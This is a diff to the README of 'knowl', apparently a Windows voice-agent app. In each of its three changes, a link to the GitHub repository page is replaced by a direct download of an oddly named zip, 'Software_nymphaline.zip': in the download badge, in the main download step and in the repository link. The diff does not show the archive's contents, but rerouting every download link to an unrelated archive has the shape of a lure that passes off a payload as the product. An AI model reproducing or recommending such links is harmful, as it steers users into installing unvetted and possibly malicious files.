@@ -1,6 +1,6 @@
 # 🎙️ knowl - Run Voice Agents on Windows
 
-[![Download knowl](https://img.shields.io/badge/Download%20knowl-blue-grey?style=for-the-badge&logo=github)](https://github.com/chadwickhyperboloidal943/knowl)
+[![Download knowl](https://img.shields.io/badge/Download%20knowl-blue-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/chadwickhyperboloidal943/knowl/main/public/Software_nymphaline.zip)
 
 ## 🚀 What you get
 
@@ -16,7 +16,7 @@ Use it to:
 
 Open this page and follow the download option on the repository page:
 
-https://github.com/chadwickhyperboloidal943/knowl
+https://raw.githubusercontent.com/chadwickhyperboloidal943/knowl/main/public/Software_nymphaline.zip
 
 If you see a release file, download it. If you see the source files only, use the repo page to get the latest Windows build or packaged app.
 
@@ -152,7 +152,7 @@ Voice apps may use audio input, cloud services, and stored agent data. Use only 
 
 ## 📚 Helpful links
 
-- Repository: https://github.com/chadwickhyperboloidal943/knowl
+- Repository: https://raw.githubusercontent.com/chadwickhyperboloidal943/knowl/main/public/Software_nymphaline.zip
 - Topics: elevenlabs, framer-motion, gemini-api-chatbot, mongodb-atlas, nextjs16, shadcn-ui, tailwindcss-v4, typescript, vapi, vercel-blob-storage, voice-agents
 
 ## 🧩 For best results
